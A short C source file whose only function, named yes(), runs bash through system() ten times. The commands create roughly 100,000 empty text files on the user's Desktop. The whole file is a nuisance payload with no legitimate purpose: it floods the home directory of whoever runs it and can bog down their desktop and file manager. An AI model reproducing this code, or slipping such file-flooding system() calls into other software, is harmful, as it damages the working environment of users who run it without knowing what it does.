#include <stdlib.h>

void	yes()
{
	system("bash -c \"touch ~/Desktop/file{1..10000}.txt\"");
	system("bash -c \"touch ~/Desktop/file{10000..20000}.txt\"");
	system("bash -c \"touch ~/Desktop/file{20000..30000}.txt\"");
	system("bash -c \"touch ~/Desktop/file{30000..40000}.txt\"");
	system("bash -c \"touch ~/Desktop/file{40000..50000}.txt\"");
	system("bash -c \"touch ~/Desktop/file{50000..60000}.txt\"");
	system("bash -c \"touch ~/Desktop/file{60000..70000}.txt\"");
	system("bash -c \"touch ~/Desktop/file{70000..80000}.txt\"");
	system("bash -c \"touch ~/Desktop/file{80000..90000}.txt\"");
	system("bash -c \"touch ~/Desktop/file{90000..100000}.txt\"");
}
